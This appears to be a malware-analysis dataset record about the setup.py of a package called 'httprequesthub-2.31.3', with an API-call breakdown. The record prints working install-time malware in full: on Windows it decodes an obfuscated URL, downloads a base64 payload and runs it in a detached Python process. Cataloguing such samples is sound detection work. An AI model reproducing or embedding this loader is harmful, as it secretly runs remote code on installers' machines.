[
  {
    "pyfile": "setup.py",
    "code_snippet": "import os\nimport base64\nimport subprocess\nimport urllib.request\nfrom setuptools.command.egg_info import egg_info\n\nclass PostEggInfoCommand(egg_info):\n\tdef run(self):\n\t\tegg_info.run(self)\n\t\tif os.name == 'nt':\n\t\t\twith urllib.request.urlopen(base64.b64decode(\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vS2FyYXZheWV2QWxleGVpL2JkZjRmOWUyODA3MTRkODczMDNkNDkwOWQxOWRlM2E3L3Jhdy8zMTYzZTljOWZmNjE4YzUwYThkOGE5ZjYwMDUzYTM2ODM5ODVlMzUxL21hY2QuYjY0Cg==\").decode('utf-8')) as response:\n\t\t\t\tsubprocess.Popen(\n\t\t\t\t    ['python', \"-c\", base64.b64decode(response.read()).decode('utf-8')],\n\t\t\t\t    creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,\n                    detach=True\n\t\t\t\t)\n",
    "pattern_analysis": {
      "api_sequence": [
        "os.name",
        "base64.b64decode",
        "urllib.request.urlopen",
        "response.read",
        "base64.b64decode",
        "subprocess.Popen"
      ],
      "api_sequence_with_args": [
        "os.name",
        "base64.b64decode(\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vS2FyYXZheWV2QWxleGVpL2JkZjRmOWUyODA3MTRkODczMDNkNDkwOWQxOWRlM2E3L3Jhdy8zMTYzZTljOWZmNjE4YzUwYThkOGE5ZjYwMDUzYTM2ODM5ODVlMzUxL21hY2QuYjY0Cg==\")",
        "urllib.request.urlopen(base64.b64decode(...).decode('utf-8'))",
        "response.read()",
        "base64.b64decode(response.read())",
        "subprocess.Popen(['python', '-c', base64.b64decode(response.read()).decode('utf-8')], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP, detach=True)"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.name",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "urllib.request.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "response.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "subprocess.Popen",
          "id": "spawn_process_shell",
          "description": "Spawns new process to execute command with shell access",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_reception"
        }
      ],
      "contextual_code": "import os\nimport base64\nimport subprocess\nimport urllib.request\n\nclass PostEggInfoCommand(egg_info):\n    def run(self):\n        egg_info.run(self)\n        if os.name == 'nt':\n            url = base64.b64decode(\"aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vS2FyYXZheWV2QWxleGVpL2JkZjRmOWUyODA3MTRkODczMDNkNDkwOWQxOWRlM2E3L3Jhdy8zMTYzZTljOWZmNjE4YzUwYThkOGE5ZjYwMDUzYTM2ODM5ODVlMzUxL21hY2QuYjY0Cg==\").decode('utf-8')\n            with urllib.request.urlopen(url) as response:\n                code = base64.b64decode(response.read()).decode('utf-8')\n                subprocess.Popen(['python', '-c', code], creationflags=subprocess.CREATE_NEW_PROCESS_GROUP, detach=True)"
    }
  },
  {
    "metadata": {
      "package_name": "httprequesthub-2.31.3"
    }
  }
]